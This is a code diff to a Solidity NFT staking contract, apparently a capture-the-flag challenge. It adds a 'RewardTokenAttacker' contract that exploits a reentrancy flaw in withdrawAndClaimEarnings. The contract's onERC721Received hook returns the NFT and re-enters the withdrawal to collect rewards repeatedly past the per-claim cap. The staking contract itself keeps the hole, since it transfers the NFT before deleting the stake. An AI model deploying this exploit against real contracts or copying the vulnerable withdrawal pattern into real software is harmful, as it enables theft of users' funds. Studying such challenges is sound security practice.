@@ -6,6 +6,7 @@ import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
+import "hardhat/console.sol";
 
 // To encourage NFT minters to hold their NFTs, the devs are allowing
 // buyers to stake their NFT and collect rewards. However, you can only
@@ -71,27 +72,20 @@ contract Depositoor is IERC721Receiver {
     }
 
     function claimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         stakes[msg.sender].depositTime = block.timestamp;
     }
 
     function withdrawAndClaimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         nft.safeTransferFrom(address(this), msg.sender, _tokenId);
         delete stakes[msg.sender];
     }
 
     function payout(address _a) private {
-        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) *
-            REWARD_RATE;
+        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;
 
         if (amountToSend > 50e18) {
             amountToSend = 50e18;
@@ -101,5 +95,32 @@ contract Depositoor is IERC721Receiver {
         }
 
         rewardToken.transfer(_a, amountToSend);
+    }
+}
+
+contract RewardTokenAttacker is IERC721Receiver {
+    bool firstTokenReceived;
+    Depositoor public depositoor;
+    IERC20 public rewardToken;
+    IERC721 public nft;
+    function attack() external {
+        depositoor.withdrawAndClaimEarnings(42);
+    }
+    function stakeNft(address _depositoor, uint256 tokenId) external {
+        depositoor = Depositoor(_depositoor);
+        rewardToken = IERC20(depositoor.rewardToken());
+        nft = IERC721(depositoor.nft());
+        nft.safeTransferFrom(address(this), address(depositoor), tokenId);
+    }
+    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
+        if (firstTokenReceived) {
+            firstTokenReceived = false;
+        } else {
+            if (rewardToken.balanceOf(address(this)) < 100e18) {
+                nft.transferFrom(address(this), address(depositoor), tokenId);
+                depositoor.withdrawAndClaimEarnings(tokenId);
+            }
+        }
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
